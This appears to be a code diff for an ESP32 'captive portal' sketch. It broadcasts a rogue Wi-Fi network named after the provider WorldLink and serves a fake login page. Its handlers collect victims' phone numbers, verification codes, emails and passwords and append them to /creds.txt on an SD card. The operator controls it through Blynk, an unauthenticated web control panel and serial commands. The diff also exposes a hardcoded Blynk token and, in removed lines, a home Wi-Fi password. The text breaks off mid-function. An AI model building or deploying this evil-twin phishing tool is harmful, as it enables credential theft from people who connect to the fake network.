@@ -1,6 +1,18 @@
+/**
+ * @file CaptivePortalController.ino
+ * @brief ESP32 Captive Portal with Blynk 2.0, SD card storage, and web admin panel.
+ * 
+ * Features:
+ * - Captive portal (AP mode) to capture phone/email credentials.
+ * - Optional download of a photo from SD card.
+ * - Web admin interface (terminal style) to control portal and download.
+ * - Blynk integration for remote control.
+ * - Serial command interface.
+ */
+
 #define BLYNK_TEMPLATE_ID "TMPL6jWYeX6NR"
 #define BLYNK_TEMPLATE_NAME "Jaffinator CP"
-#define BLYNK_AUTH_TOKEN    "0-zBQSs2oy7PawCGEKAp6Mx_Wv-oMLsq"
+#define BLYNK_AUTH_TOKEN "0-zBQSs2oy7PawCGEKAp6Mx_Wv-oMLsq"
 
 #include <WiFi.h>
 #include <DNSServer.h>
@@ -9,35 +21,35 @@
 #include <SD.h>
 #include <BlynkSimpleEsp32.h>
 
-// ===================== Wi‑Fi Credentials =====================
-char ssid[] = "Mero Net";     
-char pass[] = "af25g+40Nb5wpbu";  
+/* ==================== Wi‑Fi Credentials ==================== */
+char ssid[] = " ";
+char pass[] = " ";
 
-// ===================== SD Card SPI Pins =====================
+/* ==================== SD Card SPI Pins ==================== */
 const int sd_sck  = 18;
-const int sd_miso = 15; 
+const int sd_miso = 15;
 const int sd_mosi = 23;
 const int sd_cs   = 5;
 
-// ===================== Wi‑Fi Access Point =====================
+/* ==================== Access Point Settings ==================== */
 const char* ap_ssid = "worldlink";
-const char* html_filename = "/myworldink.html";
-const IPAddress ap_ip(192, 168, 4, 1);     
+const IPAddress ap_ip(192, 168, 4, 1);
 const IPAddress netmask(255, 255, 255, 0);
 
-// ===================== Web Server & DNS =====================
+/* ==================== Web & DNS Server ==================== */
 DNSServer dnsServer;
 WebServer server(80);
 
-// ===================== HTML buffer =====================
+/* ==================== HTML buffer (loaded from SD) ==================== */
 char* index_html = nullptr;
 const size_t MAX_HTML_SIZE = 45000;
+const char* html_filename = "/myworldink.html";
 
-// ===================== Control flags =====================
-bool portalActive = false;
-bool downloadEnabled = false;
+/* ==================== Control Flags ==================== */
+bool portalActive = false;    // Captive portal running?
+bool downloadEnabled = false; // Allow photo download?
 
-// ===================== Forward declarations =====================
+/* ==================== Function Prototypes ==================== */
 bool loadHtmlFromSD();
 void handlePortal();
 void handleCapture();
@@ -52,25 +64,31 @@ void handleApiPortal();
 void handleApiDownload();
 void handleApiStatus();
 
-// ===================== Blynk Handlers =====================
+/* ==================== Blynk Handlers ==================== */
+/**
+ * @brief Blynk virtual pin V0 – toggle captive portal.
+ */
 BLYNK_WRITE(V0) {
   if (param.asInt() == 1) startPortal();
   else stopPortal();
 }
 
+/**
+ * @brief Blynk virtual pin V1 – toggle download permission.
+ */
 BLYNK_WRITE(V1) {
   downloadEnabled = (param.asInt() == 1);
   Serial.printf("Download %s\n", downloadEnabled ? "ENABLED" : "DISABLED");
 }
 
-// ===================== Setup =====================
+/* ==================== Setup ==================== */
 void setup() {
   Serial.begin(115200);
-  while (!Serial && millis() < 2000) { delay(10); }
+  while (!Serial && millis() < 2000) delay(10);
 
   Serial.println("\n=== Captive Portal Controller + Blynk 2.0 ===");
 
-  // ---------- SD Card ----------
+  // ---- Initialise SD card ----
   SPI.begin(sd_sck, sd_miso, sd_mosi, sd_cs);
   if (!SD.begin(sd_cs, SPI, 10000000)) {
     Serial.println("❌ SD Card mount failed!");
@@ -78,7 +96,7 @@ void setup() {
     loadHtmlFromSD();
   }
 
-  // ---------- Connect to home Wi‑Fi (STA) ----------
+  // ---- Connect to home Wi‑Fi (STA) ----
   WiFi.mode(WIFI_AP_STA);
   WiFi.begin(ssid, pass);
   Serial.print("📶 Connecting to home Wi‑Fi");
@@ -94,14 +112,14 @@ void setup() {
     Serial.println("\n⚠️ Home Wi‑Fi failed – Blynk will not work.");
   }
 
-  // ---------- Blynk ----------
+  // ---- Blynk ----
   Blynk.config(BLYNK_AUTH_TOKEN);
   if (WiFi.status() == WL_CONNECTED) {
     Blynk.connect();
     Serial.println("🔵 Blynk connected");
   }
 
-  // ---------- Web server (always running) ----------
+  // ---- Web server routes ----
   server.on("/", HTTP_GET, handlePortal);
   server.on("/capture", HTTP_POST, handleCapture);
   server.on("/accept", HTTP_POST, handleAccept);
@@ -122,7 +140,7 @@ void setup() {
   Serial.print("\n> ");
 }
 
-// ===================== Main Loop =====================
+/* ==================== Main Loop ==================== */
 void loop() {
   Blynk.run();
 
@@ -130,10 +148,10 @@ void loop() {
     dnsServer.processNextRequest();
     server.handleClient();
   } else {
-    server.handleClient(); // admin always works
+    server.handleClient();
   }
 
-  // Serial commands
+  // ---- Serial command handling ----
   if (Serial.available()) {
     String cmd = Serial.readStringUntil('\n');
     cmd.trim();
@@ -167,7 +185,11 @@ void loop() {
   yield();
 }
 
-// ===================== Start / Stop Portal =====================
+/* ==================== Portal Control ==================== */
+
+/**
+ * @brief Start the captive portal (AP + DNS).
+ */
 void startPortal() {
   if (portalActive) {
     Serial.println("⚠️ Already running");
@@ -185,6 +207,9 @@ void startPortal() {
   Blynk.virtualWrite(V0, 1);
 }
 
+/**
+ * @brief Stop the captive portal.
+ */
 void stopPortal() {
   if (!portalActive) {
     Serial.println("⚠️ Not running");
@@ -197,13 +222,19 @@ void stopPortal() {
   Blynk.virtualWrite(V0, 0);
 }
 
-// ===================== Web Handlers =====================
+/* ==================== Web Handlers ==================== */
+
+/**
+ * @brief Serve the captive portal page (from SD or fallback).
+ */
 void handlePortal() {
   if (index_html) {
     server.send(200, "text/html", index_html);
-  } else {
-    // Fallback HTML – also acts as a backup captive portal page
-    String fallback = R"rawliteral(
+    return;
+  }
+
+  // Fallback simple HTML (identical to original)
+  String fallback = R"rawliteral(
 <!DOCTYPE html>
 <html>
 <head><meta name="viewport" content="width=device-width,initial-scale=1"><title>WorldLink</title>
@@ -236,16 +267,19 @@ function downloadAndClose() {
 </body>
 </html>
 )rawliteral";
-    server.send(200, "text/html", fallback);
-  }
+  server.send(200, "text/html", fallback);
 }
 
+/**
+ * @brief Handle credential capture (POST /capture).
+ */
 void handleCapture() {
   String phone = server.arg("phone");
   String code  = server.arg("code");
   String email = server.arg("email");
   String pass  = server.arg("password");
 
+  // Build timestamp
   unsigned long secs = millis() / 1000;
   unsigned long mins = secs / 60;
   unsigned long hrs  = mins / 60;
@@ -274,6 +308,9 @@ void handleCapture() {
   server.send(200, "text/html", success);
 }
 
+/**
+ * @brief Handle the "accept" button (simply calls handleCapture if args present).
+ */
 void handleAccept() {
   if (server.args() > 0) {
     handleCapture();
@@ -282,7 +319,9 @@ void handleAccept() {
   }
 }
 
-// ===================== Image download =====================
+/**
+ * @brief Serve the photo from SD card (if enabled).
+ */
 void handleDownloadPhoto() {
   if (!downloadEnabled) {
     server.send(404, "text/plain", "Download disabled");
@@ -300,7 +339,502 @@ void handleDownloadPhoto() {
   Serial.println("📸 photo.png downloaded");
 }
 
-// ===================== SD Card helpers =====================
+/* ==================== Admin Panel (Terminal Style) ==================== */
+
+/**
+ * @brief Serve the terminal‑style admin control panel.
+ */
+void handleAdmin() {
+  String page = R"rawliteral(
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Control Panel // terminal</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+    :root {
+      --bg: #050805;
+      --panel: #0a120a;
+      --green: #39ff6a;
+      --green-dim: #1c7a37;
+      --green-faint: #0f3d1c;
+      --amber: #ffb000;
+      --red: #ff3b3b;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html, body {
+      height: 100%;
+      background: radial-gradient(ellipse at center, #081208 0%, #020402 100%);
+      font-family: 'Share Tech Mono', monospace;
+      color: var(--green);
+      overflow: hidden;
+    }
+
+    .crt-wrap {
+      position: relative;
+      height: 100vh;
+      padding: 18px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    /* scanlines + flicker */
+    .crt-wrap::before {
+      content: "";
+      position: absolute; inset: 0;
+      background: repeating-linear-gradient(
+        to bottom,
+        rgba(0,0,0,0) 0px,
+        rgba(0,0,0,0) 1px,
+        rgba(0,0,0,0.18) 2px,
+        rgba(0,0,0,0.18) 3px
+      );
+      pointer-events: none;
+      z-index: 5;
+      mix-blend-mode: multiply;
+    }
+    .crt-wrap::after {
+      content: "";
+      position: absolute; inset: 0;
+      background: radial-gradient(ellipse at center, rgba(57,255,106,0.05) 0%, rgba(0,0,0,0.55) 100%);
+      pointer-events: none;
+      z-index: 6;
+      animation: flicker 6s infinite;
+    }
+    @keyframes flicker {
+      0%,96%,100%{ opacity:1; }
+      97%{ opacity:0.85; }
+      98%{ opacity:1; }
+      99%{ opacity:0.9; }
+    }
+
+    /* ----- top bar ----- */
+    .topbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border: 1px solid var(--green-dim);
+      padding: 6px 14px;
+      background: linear-gradient(180deg, rgba(57,255,106,0.05), transparent);
+      font-size: 13px;
+      letter-spacing: 1px;
+      z-index: 10;
+      flex-shrink: 0;
+    }
+    .topbar .brand {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 22px;
+      letter-spacing: 3px;
+      color: var(--green);
+      text-shadow: 0 0 8px rgba(57,255,106,0.6);
+    }
+    .topbar .brand span { color: var(--amber); }
+    .stat-cluster { display: flex; gap: 20px; align-items: center; }
+    .stat { display: flex; flex-direction: column; align-items: flex-end; font-size: 11px; color: var(--green-dim); }
+    .stat b { color: var(--green); font-size: 13px; font-weight: normal; }
+
+    .dot {
+      width: 8px; height: 8px; border-radius: 50%;
+      display: inline-block; margin-right: 6px;
+      background: var(--green-dim);
+      box-shadow: 0 0 6px var(--green-dim);
+    }
+    .dot.live { background: var(--green); box-shadow: 0 0 8px var(--green); animation: pulse 1.4s infinite; }
+    .dot.warn { background: var(--red); box-shadow: 0 0 8px var(--red); }
+    @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.35;} }
+
+    /* ----- main console ----- */
+    .console {
+      flex: 1;
+      border: 1px solid var(--green-dim);
+      background: #020602;
+      display: flex;
+      flex-direction: column;
+      min-height: 0;
+      box-shadow: inset 0 0 40px rgba(57,255,106,0.05);
+      z-index: 10;
+      overflow: hidden;
+    }
+    .console-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 6px 14px;
+      border-bottom: 1px solid var(--green-faint);
+      font-size: 11px;
+      color: var(--green-dim);
+      flex-shrink: 0;
+    }
+    .console-head .path { color: var(--green); }
+
+    .console-body {
+      flex: 1;
+      overflow-y: auto;
+      padding: 14px;
+      font-size: 13px;
+      line-height: 1.55;
+    }
+    .console-body::-webkit-scrollbar { width: 8px; }
+    .console-body::-webkit-scrollbar-thumb { background: var(--green-faint); }
+
+    .line {
+      white-space: pre-wrap;
+      word-break: break-word;
+      opacity: 0;
+      animation: appear 0.15s forwards;
+    }
+    @keyframes appear { to { opacity: 1; } }
+    .line.ok { color: var(--green); }
+    .line.info { color: #63e0d8; }
+    .line.warn { color: var(--amber); }
+    .line.err { color: var(--red); }
+    .line.dim { color: var(--green-dim); }
+
+    .prompt-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 14px;
+      border-top: 1px solid var(--green-faint);
+      font-size: 13px;
+      flex-shrink: 0;
+      background: rgba(0,0,0,0.3);
+    }
+    .prompt-row .sym { color: var(--amber); }
+    .cursor {
+      width: 8px; height: 16px;
+      background: var(--green);
+      animation: blink 1s steps(1) infinite;
+    }
+    @keyframes blink { 50%{ opacity:0; } }
+
+    /* ----- controls at bottom ----- */
+    .controls {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      border: 1px solid var(--green-dim);
+      padding: 10px 14px;
+      background: linear-gradient(180deg, rgba(57,255,106,0.04), transparent);
+      flex-shrink: 0;
+      z-index: 10;
+      flex-wrap: wrap;
+    }
+    .btn {
+      font-family: 'Share Tech Mono', monospace;
+      background: transparent;
+      border: 1px solid var(--green-dim);
+      color: var(--green);
+      padding: 8px 16px;
+      font-size: 13px;
+      letter-spacing: 1px;
+      cursor: pointer;
+      transition: all 0.15s ease;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .btn:hover { background: rgba(57,255,106,0.08); border-color: var(--green); }
+    .btn:active { transform: translateY(1px); }
+    .btn.start { color: var(--green); border-color: var(--green); }
+    .btn.start:hover { box-shadow: 0 0 14px rgba(57,255,106,0.5); }
+    .btn.stop { color: var(--red); border-color: var(--red); }
+    .btn.stop:hover { box-shadow: 0 0 14px rgba(255,59,59,0.5); background: rgba(255,59,59,0.08); }
+    .btn.sync { color: var(--amber); border-color: var(--amber); }
+    .btn.sync:hover { box-shadow: 0 0 14px rgba(255,176,0,0.4); background: rgba(255,176,0,0.08); }
+    .btn:disabled { opacity: 0.3; cursor: not-allowed; box-shadow: none !important; }
+
+    .toggle-group {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      margin-left: auto;
+    }
+    .toggle-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 12px;
+      color: var(--green-dim);
+    }
+    .toggle-item .label { color: var(--green); letter-spacing: 1px; }
+    .toggle-item .badge {
+      font-size: 10px;
+      padding: 2px 8px;
+      border-radius: 4px;
+      border: 1px solid rgba(0,255,65,0.15);
+      color: #446644;
+      background: rgba(0,255,65,0.05);
+      letter-spacing: 0.5px;
+    }
+    .toggle-item .badge.on { color: var(--green); border-color: rgba(0,255,65,0.5); background: rgba(0,255,65,0.1); }
+    .toggle-item .badge.off { color: #994444; border-color: rgba(255,50,50,0.3); background: rgba(255,0,0,0.05); }
+
+    /* custom toggle switch */
+    .toggle-switch {
+      position: relative;
+      width: 44px;
+      height: 24px;
+      flex-shrink: 0;
+      cursor: pointer;
+    }
+    .toggle-switch input {
+      opacity: 0;
+      width: 0;
+      height: 0;
+      position: absolute;
+    }
+    .slider {
+      position: absolute;
+      inset: 0;
+      background: #111;
+      border: 1px solid #223322;
+      border-radius: 24px;
+      transition: 0.25s;
+      display: flex;
+      align-items: center;
+      padding: 0 3px;
+    }
+    .slider::before {
+      content: '';
+      height: 16px;
+      width: 16px;
+      background: #2a3d2a;
+      border-radius: 50%;
+      transition: 0.25s;
+    }
+    input:checked + .slider {
+      border-color: #00cc33;
+      background: #001800;
+    }
+    input:checked + .slider::before {
+      transform: translateX(20px);
+      background: var(--green);
+    }
+
+    .last-sync {
+      font-size: 10px;
+      color: #223322;
+      letter-spacing: 0.3px;
+      margin-left: 10px;
+    }
+
+    @media (max-width: 700px) {
+      .controls { flex-direction: column; align-items: stretch; }
+      .toggle-group { margin-left: 0; justify-content: space-around; }
+      .topbar .brand { font-size: 16px; }
+    }
+  </style>
+</head>
+<body>
+<div class="crt-wrap">
+
+  <div class="topbar">
+    <div class="brand">CTRL<span>//</span>PANEL</div>
+    <div class="stat-cluster">
+      <div class="stat"><span><span class="dot live"></span>NODE</span><b id="nodeName">ESP32</b></div>
+      <div class="stat">IP<b id="espIp">192.168.4.1</b></div>
+      <div class="stat">CLOCK<b id="clock">00:00:00</b></div>
+    </div>
+  </div>
+
+  <div class="console">
+    <div class="console-head">
+      <span>proc <span class="path">/var/log/control.log</span></span>
+      <span id="lineCount">0 lines</span>
+    </div>
+    <div class="console-body" id="consoleBody"></div>
+    <div class="prompt-row">
+      <span class="sym">ctrl@panel:~$</span>
+      <span class="cursor"></span>
+    </div>
+  </div>
+
+  <div class="controls">
+    <button class="btn sync" id="syncBtn"><span>⟳</span> SYNC</button>
+    <span class="last-sync" id="lastSync">not synced</span>
+
+    <div class="toggle-group">
+      <div class="toggle-item">
+        <span class="label">PORTAL</span>
+        <span class="badge off" id="portalBadge">OFF</span>
+        <label class="toggle-switch">
+          <input type="checkbox" id="portalToggle">
+          <span class="slider"></span>
+        </label>
+      </div>
+      <div class="toggle-item">
+        <span class="label">DOWNLOAD</span>
+        <span class="badge off" id="downloadBadge">OFF</span>
+        <label class="toggle-switch">
+          <input type="checkbox" id="downloadToggle">
+          <span class="slider"></span>
+        </label>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  const consoleBody = document.getElementById('consoleBody');
+  const lineCountEl = document.getElementById('lineCount');
+  const portalToggle = document.getElementById('portalToggle');
+  const downloadToggle = document.getElementById('downloadToggle');
+  const portalBadge = document.getElementById('portalBadge');
+  const downloadBadge = document.getElementById('downloadBadge');
+  const syncBtn = document.getElementById('syncBtn');
+  const lastSync = document.getElementById('lastSync');
+  const espIp = document.getElementById('espIp');
+  const clockEl = document.getElementById('clock');
+
+  let lineTotal = 0;
+
+  function timestamp() {
+    const d = new Date();
+    return d.toTimeString().slice(0,8);
+  }
+
+  function addLine(cls, text) {
+    const div = document.createElement('div');
+    div.className = 'line ' + cls;
+    div.textContent = text;
+    consoleBody.appendChild(div);
+    consoleBody.scrollTop = consoleBody.scrollHeight;
+    lineTotal++;
+    lineCountEl.textContent = lineTotal + ' lines';
+  }
+
+  function updateUI(portal, download) {
+    portalToggle.checked = portal;
+    portalBadge.textContent = portal ? 'ON' : 'OFF';
+    portalBadge.className = 'badge ' + (portal ? 'on' : 'off');
+
+    downloadToggle.checked = download;
+    downloadBadge.textContent = download ? 'ON' : 'OFF';
+    downloadBadge.className = 'badge ' + (download ? 'on' : 'off');
+
+    const now = new Date();
+    lastSync.textContent = 'sync: ' + now.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit',second:'2-digit'});
+  }
+
+  async function fetchStatus() {
+    syncBtn.disabled = true;
+    try {
+      const res = await fetch('/api/status');
+      const data = await res.json();
+      updateUI(data.portal, data.download);
+      addLine('dim', '[sync] status fetched');
+    } catch (e) {
+      addLine('err', '[sync] failed to fetch status');
+    } finally {
+      syncBtn.disabled = false;
+    }
+  }
+
+  async function sendCommand(type, state) {
+    const action = state ? 'on' : 'off';
+    try {
+      const res = await fetch('/api/' + type + '?state=' + action);
+      if (!res.ok) throw new Error('HTTP ' + res.status);
+      const msg = type.toUpperCase() + ' ' + (state ? 'activated' : 'deactivated');
+      addLine('ok', '[cmd] ' + msg);
+      await fetchStatus();
+    } catch (e) {
+      addLine('err', '[cmd] ' + type + ' toggle failed');
+    }
+  }
+
+  portalToggle.addEventListener('change', function() {
+    sendCommand('portal', this.checked);
+  });
+
+  downloadToggle.addEventListener('change', function() {
+    sendCommand('download', this.checked);
+  });
+
+  syncBtn.addEventListener('click', function() {
+    addLine('info', '[sync] manual sync requested');
+    fetchStatus();
+  });
+
+  function tickClock() {
+    clockEl.textContent = timestamp();
+  }
+  setInterval(tickClock, 1000);
+  tickClock();
+
+  espIp.textContent = window.location.hostname;
+  addLine('dim', 'system ready. use toggles to control portal and download.');
+  fetchStatus();
+  setInterval(fetchStatus, 5000);
+</script>
+</body>
+</html>
+  )rawliteral";
+  server.send(200, "text/html", page);
+}
+
+/* ==================== API Endpoints ==================== */
+
+/**
+ * @brief API to start/stop portal.
+ * @param state "on" or "off"
+ */
+void handleApiPortal() {
+  String state = server.arg("state");
+  if (state == "on") {
+    startPortal();
+    server.send(200, "text/plain", "Portal ON");
+  } else if (state == "off") {
+    stopPortal();
+    server.send(200, "text/plain", "Portal OFF");
+  } else {
+    server.send(400, "text/plain", "Usage: ?state=on|off");
+  }
+}
+
+/**
+ * @brief API to enable/disable download.
+ * @param state "on" or "off"
+ */
+void handleApiDownload() {
+  String state = server.arg("state");
+  if (state == "on") {
+    downloadEnabled = true;
+    Blynk.virtualWrite(V1, 1);
+    server.send(200, "text/plain", "Download ENABLED");
+  } else if (state == "off") {
+    downloadEnabled = false;
+    Blynk.virtualWrite(V1, 0);
+    server.send(200, "text/plain", "Download DISABLED");
+  } else {
+    server.send(400, "text/plain", "Usage: ?state=on|off");
+  }
+}
+
+/**
+ * @brief Return current status as JSON.
+ */
+void handleApiStatus() {
+  String json = "{";
+  json += "\"portal\":" + String(portalActive ? "true" : "false") + ",";
+  json += "\"download\":" + String(downloadEnabled ? "true" : "false");
+  json += "}";
+  server.send(200, "application/json", json);
+}
+
+/* ==================== SD Card Helpers ==================== */
+
+/**
+ * @brief Append a line to /creds.txt on SD card.
+ */
 void writeCredToSD(String data) {
   File file = SD.open("/creds.txt", FILE_APPEND);
   if (!file) {
@@ -312,6 +846,10 @@ void writeCredToSD(String data) {
   Serial.println("💾 Saved to SD");
 }
 
+/**
+ * @brief Load HTML from SD into index_html buffer.
+ * @return true if successful.
+ */
 bool loadHtmlFromSD() {
   File file = SD.open(html_filename);
   if (!file) {
@@ -337,221 +875,11 @@ bool loadHtmlFromSD() {
   return true;
 }
 
-// ===================== Admin page  =====================
-void handleAdmin() {
-  String page = R"rawliteral(
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-      <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Control Panel</title>
-      <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Courier New',monospace;background:#0a0a0a;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}
-        body::before{content:'';position:fixed;inset:0;background-image:radial-gradient(rgba(0,255,65,0.07) 1px,transparent 1px);background-size:28px 28px;z-index:0}
-        .wrap{position:relative;z-index:1;max-width:540px;width:100%;background:rgba(8,8,8,0.96);border:1px solid #1a4d1a;border-radius:14px;padding:26px 22px 18px}
-        .hdr{display:flex;align-items:center;gap:12px;margin-bottom:22px;padding-bottom:14px;border-bottom:1px solid rgba(0,255,65,0.12)}
-        .hdr-icon{width:36px;height:36px;background:rgba(0,255,65,0.07);border:1px solid rgba(0,255,65,0.2);border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
-        .hdr-icon svg{width:18px;height:18px;stroke:#00ff41;stroke-width:1.5;fill:none}
-        .hdr h1{font-size:15px;font-weight:400;color:#00e83a;letter-spacing:2.5px}
-        .hdr .sub{font-size:11px;color:#336633;margin-top:3px;letter-spacing:0.8px}
-        .card{background:rgba(0,255,65,0.02);border:1px solid rgba(0,255,65,0.1);border-radius:9px;padding:14px 16px;margin-bottom:11px;transition:border-color 0.25s}
-        .card:hover{border-color:rgba(0,255,65,0.3)}
-        .card-hdr{display:flex;justify-content:space-between;align-items:center;margin-bottom:9px}
-        .card-title{display:flex;align-items:center;gap:10px;font-size:13px;color:#a0c0a0;letter-spacing:0.5px}
-        .card-title svg{width:16px;height:16px;stroke:currentColor;stroke-width:1.5;fill:none;opacity:0.7}
-        .badge{font-size:10px;padding:2px 9px;border-radius:4px;border:1px solid rgba(0,255,65,0.15);color:#446644;background:rgba(0,255,65,0.05);letter-spacing:0.5px;display:flex;align-items:center;gap:5px}
-        .badge.on{color:#00ff41;border-color:rgba(0,255,65,0.5);background:rgba(0,255,65,0.1)}
-        .badge.off{color:#994444;border-color:rgba(255,50,50,0.3);background:rgba(255,0,0,0.05)}
-        .dot{width:5px;height:5px;border-radius:50%;background:currentColor;display:inline-block}
-        .badge.on .dot{animation:pulse 2s ease-in-out infinite}
-        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
-        .toggle{position:relative;width:50px;height:26px;flex-shrink:0;cursor:pointer}
-        .toggle input{opacity:0;width:0;height:0;position:absolute}
-        .slider{position:absolute;inset:0;background:#111;border:1px solid #223322;border-radius:26px;transition:0.25s;display:flex;align-items:center;padding:0 3px}
-        .slider::before{content:'';height:18px;width:18px;background:#2a3d2a;border-radius:50%;transition:0.25s}
-        input:checked+.slider{border-color:#00cc33;background:#001800}
-        input:checked+.slider::before{transform:translateX(24px);background:#00ff41}
-        .status-row{display:flex;justify-content:space-between;font-size:11px;color:#446644;padding-top:8px;border-top:1px solid rgba(0,255,65,0.05)}
-        .status-row .val.on{color:#00e83a}
-        .status-row .val.off{color:#cc4444}
-        .footer{display:flex;justify-content:space-between;align-items:center;margin-top:16px;padding-top:13px;border-top:1px solid rgba(0,255,65,0.08);font-size:11px;color:#2d4d2d}
-        .ip-pill{background:rgba(0,255,65,0.04);border:1px solid rgba(0,255,65,0.1);border-radius:5px;padding:4px 12px;color:#4a8a4a;display:flex;align-items:center;gap:7px}
-        .ip-pill svg{width:12px;height:12px;stroke:currentColor;stroke-width:1.5;fill:none;opacity:0.7}
-        .sync-btn{background:none;border:1px solid #1a3d1a;color:#446644;cursor:pointer;font-size:11px;padding:4px 12px;border-radius:5px;transition:0.2s;font-family:'Courier New',monospace;display:flex;align-items:center;gap:6px}
-        .sync-btn svg{width:12px;height:12px;stroke:currentColor;stroke-width:1.5;fill:none;transition:transform 0.4s}
-        .sync-btn:hover{border-color:#00cc33;color:#00cc33}
-        .sync-btn.spinning svg{transform:rotate(360deg)}
-        .last-sync{font-size:10px;color:#223322;text-align:center;margin-top:10px;letter-spacing:0.3px}
-        @media(max-width:480px){.wrap{padding:14px}.card{padding:10px 12px}.toggle{width:44px;height:22px}.slider::before{height:14px;width:14px}input:checked+.slider::before{transform:translateX(22px)}}
-      </style>
-    </head>
-    <body>
-    <div class="wrap">
-      <div class="hdr">
-        <div class="hdr-icon">
-          <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
-        </div>
-        <div>
-          <h1># Control Panel</h1>
-          <div class="sub">&gt;_ captive portal &amp; download manager</div>
-        </div>
-      </div>
+/* ==================== Help (Serial) ==================== */
 
-      <div class="card">
-        <div class="card-hdr">
-          <div class="card-title">
-            <svg viewBox="0 0 24 24"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><circle cx="12" cy="20" r="1" fill="currentColor"/></svg>
-            Portal
-            <span class="badge off" id="portalBadge"><span class="dot"></span> OFF</span>
-          </div>
-          <label class="toggle">
-            <input type="checkbox" id="portalToggle" aria-label="Portal toggle">
-            <span class="slider"></span>
-          </label>
-        </div>
-        <div class="status-row">
-          <span>STATUS</span>
-          <span class="val off" id="portalStatus">Inactive</span>
-        </div>
-      </div>
-
-      <div class="card">
-        <div class="card-hdr">
-          <div class="card-title">
-            <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-            Download
-            <span class="badge off" id="downloadBadge"><span class="dot"></span> OFF</span>
-          </div>
-          <label class="toggle">
-            <input type="checkbox" id="downloadToggle" aria-label="Download toggle">
-            <span class="slider"></span>
-          </label>
-        </div>
-        <div class="status-row">
-          <span>STATUS</span>
-          <span class="val off" id="downloadStatus">Disabled</span>
-        </div>
-      </div>
-
-      <div class="footer">
-        <div class="ip-pill">
-          <svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="2"/><path d="M8 12h8M12 8v8"/></svg>
-          <span id="espIp">192.168.4.1</span>
-        </div>
-        <button class="sync-btn" id="syncBtn" onclick="fetchStatus()">
-          <svg viewBox="0 0 24 24" id="syncIcon"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
-          SYNC
-        </button>
-      </div>
-      <div class="last-sync" id="lastSync">not synced yet</div>
-    </div>
-
-    <script>
-      const portalToggle = document.getElementById('portalToggle');
-      const downloadToggle = document.getElementById('downloadToggle');
-      const portalBadge = document.getElementById('portalBadge');
-      const downloadBadge = document.getElementById('downloadBadge');
-      const portalStatus = document.getElementById('portalStatus');
-      const downloadStatus = document.getElementById('downloadStatus');
-      const espIp = document.getElementById('espIp');
-      const lastSync = document.getElementById('lastSync');
-      const syncBtn = document.getElementById('syncBtn');
-
-      espIp.textContent = window.location.hostname;
-
-      function updateUI(portal, download) {
-        portalToggle.checked = portal;
-        portalBadge.innerHTML = '<span class="dot"></span> ' + (portal ? 'ON' : 'OFF');
-        portalBadge.className = 'badge ' + (portal ? 'on' : 'off');
-        portalStatus.textContent = portal ? 'Active' : 'Inactive';
-        portalStatus.className = 'val ' + (portal ? 'on' : 'off');
-
-        downloadToggle.checked = download;
-        downloadBadge.innerHTML = '<span class="dot"></span> ' + (download ? 'ON' : 'OFF');
-        downloadBadge.className = 'badge ' + (download ? 'on' : 'off');
-        downloadStatus.textContent = download ? 'Enabled' : 'Disabled';
-        downloadStatus.className = 'val ' + (download ? 'on' : 'off');
-
-        const now = new Date();
-        lastSync.textContent = 'last sync: ' + now.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit',second:'2-digit'});
-      }
-
-      async function fetchStatus() {
-        syncBtn.classList.add('spinning');
-        try {
-          const res = await fetch('/api/status');
-          const data = await res.json();
-          updateUI(data.portal, data.download);
-        } catch (e) {
-          lastSync.textContent = 'sync failed — retrying...';
-        } finally {
-          setTimeout(() => syncBtn.classList.remove('spinning'), 400);
-        }
-      }
-
-      async function sendCommand(type, state) {
-        try {
-          const res = await fetch('/api/' + type + '?state=' + (state ? 'on' : 'off'));
-          if (!res.ok) throw new Error('HTTP ' + res.status);
-          await fetchStatus();
-        } catch (e) {
-          console.error('Command failed:', e);
-          await fetchStatus();
-        }
-      }
-
-      portalToggle.addEventListener('change', function() { sendCommand('portal', this.checked); });
-      downloadToggle.addEventListener('change', function() { sendCommand('download', this.checked); });
-
-      fetchStatus();
-      setInterval(fetchStatus, 3000);
-    </script>
-    </body>
-    </html>
-      )rawliteral";
-  server.send(200, "text/html", page);
-}
-
-// ===================== API handlers =====================
-void handleApiPortal() {
-  String state = server.arg("state");
-  if (state == "on") {
-    startPortal();
-    server.send(200, "text/plain", "Portal ON");
